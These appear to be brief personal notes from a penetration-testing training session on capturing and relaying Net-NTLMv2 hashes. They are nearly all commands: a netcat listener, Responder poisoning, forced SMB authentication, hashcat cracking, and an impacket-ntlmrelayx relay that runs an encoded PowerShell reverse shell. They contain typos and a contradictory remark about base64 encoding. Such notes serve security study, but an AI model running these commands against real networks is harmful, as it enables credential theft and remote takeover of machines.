# Hacktrack with Mentors Password Attacks
* 2025OCT11
* Abyssal-Raheel

## Relaying Net-NTLMv2


```powershell
rlwrap ncat 192.168.IP 5555

# on remote machine, 
sudo responder -I tun0 -A
# -A is ONLY analyze mode

# initiate SMB connection to machine running responder
dir \\192.168.IP\notarealshare

# ON responder machine, we should see the NTLMv2 hash
# could crack with hashcat
haschat --help |  grep -i ntlmv2

# if strong password, we can relay instead of cracking
impacket-ntlmrelayx --help

impacket-ntlmrelayx --help

# dir from client to ntlmreplay server
impacket-ntlmrelayx --no-http-server -smb2support -t   192.168.1.IP

# can use Powershell #1 for rev shell, 
# do NOT use base64, as it will cause issues if not encoded properly in UTF16LE

impacket-ntlmrelayx  --no-http-server -smb2support -t   192.168.1.IP -c "powershell.exe -enc base64encdoedstuff"
```